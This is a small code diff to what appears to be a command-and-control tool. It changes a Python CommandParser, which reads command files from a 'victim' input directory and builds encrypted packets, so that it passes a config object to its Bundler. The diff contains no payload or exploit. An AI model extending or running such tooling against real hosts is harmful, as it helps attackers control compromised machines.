@@ -12,6 +12,9 @@ from bundler.bundler import Bundler
 
 class CommandParser():
 
+    def __init__(self, config):
+        self.config = config
+
     def parse(self, victim_mac, victim_pkt, rel_path, command_file):
         """Parses the input file in the input directory of victim and builds packet for command
         
@@ -29,7 +32,7 @@ class CommandParser():
         pkts = []
         path = rel_path + '/input/' + command_file
         if os.path.isfile(path):
-            bundler = Bundler(victim_mac, victim_pkt)
+            bundler = Bundler(victim_mac, victim_pkt, self.config)
 
             # Open file contents, encrypt, and build response packet
             with open(path) as f:
